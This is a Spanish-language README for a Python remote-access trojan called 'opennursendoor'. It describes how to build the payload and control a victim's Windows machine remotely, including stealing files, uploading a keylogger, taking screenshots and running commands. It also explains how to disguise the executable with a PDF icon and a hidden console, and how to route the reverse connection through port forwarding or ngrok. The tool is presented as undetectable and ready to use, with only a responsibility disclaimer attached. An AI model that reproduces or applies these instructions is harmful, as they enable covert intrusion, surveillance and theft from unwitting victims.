# opennursendoor
By opennursen.
Python version 3.10 codigo libre

# Descripcion:

Opennursendoor es un troyano programado con python 3.10 encargado de obtener el control remoto total de la maquina victima.
ha sido programado para ser usado particularmente en windows aunque con algunas modificaciones en el codigo tales como "os.system('cls')" por "os.system('clear')" puede ser usado en linux para que no genere problemas.

Es completamente indetectable. El codigo no genera persistencia en la maquina victima pero puede sugerir como. Aunque ya se ha probado el clasico registro en windows pero actualmente lo detecta como "movimiento sospechoso".

Por ser la v1 el troyano esta programado para solo aceptar y recibir una sola conexion, es decir, que usted solo podra infectar una maquina victima a la vez. Aunque ya estoy trabajando en la v2 en la cual permitira aceptar mas de una conexion y poder elegir a que maquina acceder.

# Funcionalidad:

1. Permite configurar y crear un servidor que queda la escucha de una conexion.
2. Permite crear y configurar la carga con extencion .py llamado "backdoor.py"

NOTA: Obviamente no olvide modificar el nombre antes de enviar.


# Caracteristicas:

1. salir----->              Termina la conexion
2. dir----->                listar directorios
3. cd----->                 moverse entre directorios (ex: cd photos)
4. mkdir----->              crear carpetas (ex: mkdir videos)
5. eliminar----->           Eliminar archivo o carpeta
6. buzzlightyear----->      Crear un buffer de carpetas infinitas
7. apagar----->             apagar maquina objetivo
8. descargar----->          descargar archivos de victima (ex: descargar test.word)
9. subir----->              subir archivo a victima (ex: subir keylogger.exe)
10. cmd----->               usar consola CMD (ex: cmd systeminfo)
11. captura----->           screenshot a victima. AVISO: Cambiar nombre de captura antes de tomar otra
12. ejecutar----->          ejecutar x programa (ex: ejecutar calc)

NOTA: Al tomar cada captura o screenshot debe cambiar el nombre de la primera captura antes de tomar otra o el codigo generara error debido a que generara otra captura con el mismo nombre.

# Librerias usadas y recomendaciones:

Recomendamos no olvide tener instalado python3 y luego que se asegure de tener instaladas todas las librerias necesarias antes de usar el programa y generar un troyano para evitar errores aunque muchas de ellas python ya las posee de forma nativa, pero preveer es mejor que lamentar ;)

1. Socket
2. subprocess
3. os
4. shutil
5. random
6. string
7. struct
8. pyautogui
9. time

NOTA: Ejemplo de como instalar libreria: "pip  install pyautogui"

# Sugerencias:

CONVERTIR CARGA .PY A EXE:

Primero asegurese de tener instalado "pyinstaller".

La carga puede ser perfectamente convertida a .exe con "pyinstaller --noconsole --onfile --icon=C:\Desktop\pdf.ico C:\Desktop\backdoor.py".

En donde:
1. --noconsole > "permite la ejecucion del troyano sin que se abra un cmd".
2. --onefile   > "permite compilar todo el troyano en un unico archivo. (No sera necesario que la victima tenga instalada python ni librerias.)".
3. --icon="Ruta del icono"     > "Le agrega un icono al ejecutable".
4. al final es la ruta en donde se encuentra el backdoor generado.

NOTA: Tambien puede adjuntarlo a un archivo PDF y que se ejecute en segundo plano pero eso ya queda a su disposicion. Ya he dado suficiente detalle como hasta para que un scripkiddies pueda divertirse un rato ;)

# Opciones del programa:

EJECUTAR PROGRAMA (python servidor.py)

-Primero hablaremos de la OPCION 2: configurar y crear un troyano:-

En ambos casos pedira IP y PUERTO.

Para ataque en Red Local: 
IP: "SU IP LOCAL"
Puerto: 5555 o cualquier otro

Para ataque fuera de la Red Local con Ip Publica:

IP Publica: "su ip publica"
Puerto:    "5555 o cualquier otro"

Para ataque fuera de la Red Local usando NGROK:

1. Primero asegurese de descargar y configrar NGROK de forma correcta: https://ngrok.com/download
2. Ejecute ngrok y use la funcion TCP : "ngrok tcp 5555"
3. Con eso NGROK le dara una direccion y un puerto. Se vera algo asi: "tcp://0.tcp.sa.ngrok.io:14625 -> localhost:5555"

continuando la direccion a usar para el troyano sera: 0.tcp.sa.ngrok.io

1. entonces ip a configurar el troyano : 0.tcp.sa.ngrok.io
2. puerto a configurar el troyano: 14625
RECORDAR: QUE ESTAMOS CONFIGURANDO EL TROYANO Y EL SE CONECTARA HACIA NOSOTROS DESDE AFUERA.
3. Listo.

OPCION 1: Configuracion del servidor.

EN CASO DE SER Red LAN:

IP : "SU IP LOCAL"
PUERTO: "MISMO PUERTO QUE EL QUE CONFIGURO DE TROYANO"

Fuera de RED LOCAL CON IP PUBLICA:

IP: "SU IP LOCAL"
PUERTO:"MISMO PUERTO QUE EL TROYANO"

NOTA: lo que sucede aqui es que usted ingresar a su router y hacer un redireccionamiento a solicitudes entrantes y que se redireccionen a su ip local, es decir,
el troyano se conectara a su ip publica y al puerto expecificado y su router le reenviara dicha conexion a su ip local.

PARA EL USO CON NGROK:

IP: 0.0.0.0
PUERTO: 5555

NOTA: si se fija es el puerto con el que anteriormente hemos configurado ngrok antes.


# Toma de consentimiento y desligo de responsabilidades

El programador bajo en ninguna circunstancias se hace responsable del uso que usted pueda darle. Al estar descargando y hacer uso del programa usted acepta que es de tu totalidad responsabilidad el uso que pueda darle.

Publico el programa bajo la licencia python como un codigo libre.


















